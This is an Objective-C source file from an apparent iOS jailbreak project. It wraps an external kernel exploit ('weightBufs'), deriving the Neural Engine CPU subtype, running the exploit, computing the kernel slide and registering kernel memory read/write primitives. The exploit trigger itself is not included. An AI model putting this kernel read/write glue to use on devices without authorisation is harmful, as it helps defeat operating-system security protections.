//
//  weightBufs.c
//  weightBufs
//
//  Created by Lars Fröder on 27.04.24.
//

#include <stdio.h>

#import <Foundation/Foundation.h>
#import <mach-o/loader.h>
#import <libjailbreak/primitives_external.h>
#import <libjailbreak/info.h>

@interface _ANEDeviceInfo : NSObject
+(NSString*)aneSubType;
@end
extern uint32_t subtypeToUse;
extern int exploit(uint64_t *kernelBaseOut);
extern void kwrite64(uint64_t address,uint64_t value);
extern uint32_t kread32(uint64_t address);
extern void cleanup(void);

#define kread_from_method(type, method)                                             \
    do {                                                                            \
        volatile type* type_base = (volatile type*)(uaddr);                         \
        uint64_t type_size = ((size) / (sizeof(type)));                                  \
        for (uint64_t type_offset = 0; type_offset < type_size; type_offset++) {         \
            type type_value = method(kaddr + (type_offset * sizeof(type)));    \
            type_base[type_offset] = type_value;                                    \
        }                                                                           \
    } while (0)

#define kwrite_from_method(type, method)                                       \
    do {                                                                       \
        volatile type* type_base = (volatile type*)(uaddr);                    \
        uint64_t type_size = ((size) / (sizeof(type)));                             \
        for (uint64_t type_offset = 0; type_offset < type_size; type_offset++) {    \
            type type_value = type_base[type_offset];                          \
            method( kaddr + (type_offset * sizeof(type)), type_value);     \
        }                                                                      \
    } while (0)

int kreadbuf(uint64_t kaddr, void* uaddr, size_t size)
{
    switch (size) {
        case sizeof(uint8_t): {
            uint32_t r = kread32(kaddr);
            *(uint8_t *)uaddr = (uint8_t)r;
            break;
        }
        case sizeof(uint16_t): {
            uint32_t r = kread32(kaddr);
            *(uint16_t *)uaddr = (uint16_t)r;
            break;
        }
        default:
            kread_from_method(uint32_t, kread32);
            break;
    }
    return 0;
}

int kwritebuf(uint64_t kaddr, const void* uaddr, size_t size)
{
    switch (size) {
        case sizeof(uint8_t): {
            uint8_t r[8] = { 0 };
            kreadbuf(kaddr, r, sizeof(r));
            r[0] = *(uint8_t *)uaddr;
            kwrite64(kaddr, *(uint64_t *)r);
            break;
        }
        case sizeof(uint16_t): {
            uint16_t r[4] = { 0 };
            kreadbuf(kaddr, r, sizeof(r));
            r[0] = *(uint16_t *)uaddr;
            kwrite64(kaddr, *(uint64_t *)r);
            break;
        }
        case sizeof(uint32_t): {
            uint32_t r[2] = { 0 };
            kreadbuf(kaddr, r, sizeof(r));
            r[0] = *(uint32_t *)uaddr;
            kwrite64(kaddr, *(uint64_t *)r);
            break;
        }
        default:
            kwrite_from_method(uint64_t, kwrite64);
            break;
    }
    return 0;
}

int getAneSubtype(void)
{
    NSBundle *appleNeuralEngineBundle = [NSBundle bundleWithPath:@"/System/Library/PrivateFrameworks/AppleNeuralEngine.framework"];
    [appleNeuralEngineBundle load];
    Class _ANEDeviceInfoClass = NSClassFromString(@"_ANEDeviceInfo");
    
    NSURL* imagingNetworksURL = [NSURL fileURLWithPath:@"/System/Library/ImagingNetworks"];
    NSDirectoryEnumerator<NSURL*>* enumerator = [[NSFileManager defaultManager] enumeratorAtURL:imagingNetworksURL includingPropertiesForKeys:nil options:0 errorHandler:nil];
    NSURL* file;
    
    NSString* aneSubType = [_ANEDeviceInfoClass aneSubType].uppercaseString;
    while(file = [enumerator nextObject])
    {
        if([file.pathExtension isEqualToString:@"hwx"] && [file.lastPathComponent containsString:aneSubType])
        {
            struct mach_header header;
            FILE* f = fopen(file.fileSystemRepresentation, "r");
            if(!f) continue;
            fread(&header, sizeof(struct mach_header), 1, f);
            fclose(f);
            return header.cpusubtype;
        }
    }
    return -1;
}

int exploit_init(const char *flavor)
{
    int subtype = getAneSubtype();
    if (subtype == -1) return -1;
    
    subtypeToUse = subtype;
    uint64_t kernelbase = 0;
    int r = exploit(&kernelbase);
    if (r != 0) return r;
    
    gPrimitives.krwMinSafeReadSize = 0;
    gPrimitives.kwritebuf = kwritebuf;
    gPrimitives.kreadbuf = kreadbuf;
    gSystemInfo.kernelConstant.slide = kernelbase - kconstant(staticBase);
    
    return 0;
}

int exploit_deinit(void)
{
    if (gPrimitives.kreadbuf == kreadbuf) {
        gPrimitives.kreadbuf = NULL;
    }
    if (gPrimitives.kwritebuf == kwritebuf) {
        gPrimitives.kwritebuf = NULL;
    }
    
    cleanup();
    return 0;
}
